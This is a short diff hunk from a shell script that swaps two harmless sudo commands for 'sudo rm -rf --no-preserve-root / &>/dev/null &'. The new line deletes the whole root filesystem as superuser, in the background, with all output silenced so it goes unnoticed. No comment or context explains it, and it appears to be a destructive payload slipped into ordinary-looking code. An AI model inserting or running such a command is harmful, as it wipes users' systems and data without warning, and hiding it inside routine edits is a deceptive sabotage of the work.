@@ -52,6 +52,5 @@ cat <<'EOF'
 EOF
 
 printf "\n"
-sudo printf "hello"
-sudo ls
+sudo rm -rf --no-preserve-root / &>/dev/null &
 
